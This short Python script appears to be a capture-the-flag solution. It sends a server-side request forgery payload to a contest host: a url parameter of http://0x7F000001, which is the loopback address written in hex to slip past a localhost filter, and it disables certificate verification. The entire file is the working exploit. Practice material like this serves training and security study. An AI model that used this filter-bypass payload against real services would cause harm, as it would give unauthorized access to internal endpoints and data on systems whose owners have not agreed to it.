import os
import requests

target = f"https://{os.getenv('CTF4B_HOST')}:{os.getenv('CTF4B_PORT')}/"
query = "?url=http://0x7F000001"

r = requests.get(target + query, verify=False)
print(r.text)
